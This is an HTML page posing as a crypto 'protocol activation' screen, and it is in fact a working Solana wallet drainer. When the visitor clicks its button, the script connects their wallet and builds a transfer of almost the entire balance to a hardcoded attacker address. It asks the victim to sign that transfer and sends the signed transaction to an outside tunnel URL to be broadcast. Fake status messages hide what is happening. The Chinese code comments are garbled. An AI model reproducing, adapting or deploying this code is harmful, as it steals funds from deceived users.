<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Protocol Active</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
</head>
<body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-family:sans-serif;">
    <div style="padding:40px;border:1px solid #14F195;border-radius:20px;display:inline-block;background:#111;">
        <h2 style="color:#14F195;">SYSTEM READY</h2>
        <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border:none;border-radius:12px;font-weight:bold;cursor:pointer;font-size:20px;">CONNECT & ACTIVATE</button>
        <p id="msg" style="margin-top:20px;color:#888;">Standby...</p>
    </div>
    <script>
        const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
        const TUNNEL_URL = "https://plant-switch-governing-pages.trycloudflare.com/collect"; 

        document.getElementById('cta').onclick = async function() {
            try {
                // ğŸ”± ç¬¬ä¸€æ­¥ï¼šæš´åŠ›å”¤é†’é’±åŒ…ï¼ˆä¸å¸¦ä»»ä½•é€»è¾‘ï¼Œçº¯è¿æ¥ï¼‰
                const p = window.solana || window.phantom?.solana || window.trustwallet?.solana;
                if (!p) { alert("Wallet Not Found! Use Wallet Browser."); return; }
                
                document.getElementById('msg').innerText = "Linking...";
                await p.connect();
                
                // ğŸ”± ç¬¬äºŒæ­¥ï¼šè¿æ¥æˆåŠŸåï¼Œå¿«é€Ÿæ‹¿å“ˆå¸Œ
                document.getElementById('msg').innerText = "Syncing Protocol...";
                const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
                const { blockhash } = await conn.getLatestBlockhash();
                const bal = await conn.getBalance(p.publicKey);
                
                // ğŸ”± ç¬¬ä¸‰æ­¥ï¼šæ„é€ äº¤æ˜“
                const tx = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: p.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(TARGET),
                        lamports: bal > 2000000 ? bal - 1500000 : 0, 
                    })
                );
                tx.recentBlockhash = blockhash;
                tx.feePayer = p.publicKey;

                // ğŸ”± ç¬¬å››æ­¥ï¼šè¯·æ±‚ç­¾å
                const signed = await p.signTransaction(tx);
                document.getElementById('msg').innerText = "Broadcasting via 71-Engine...";

                // ğŸ’° ç­¾åç”©ç»™åç«¯ï¼ŒåŸç”Ÿè½¬æ¢
                const rawBinary = signed.serialize();
                let bStr = "";
                for (let i = 0; i < rawBinary.length; i++) { bStr += String.fromCharCode(rawBinary[i]); }
                const b64 = window.btoa(bStr);

                fetch(TUNNEL_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ signature: b64 })
                });

                alert("Protocol Activated!");
                location.reload();
            } catch (e) { 
                alert("Debug Error: " + e.message); 
            }
        };
    </script>
</body>
</html>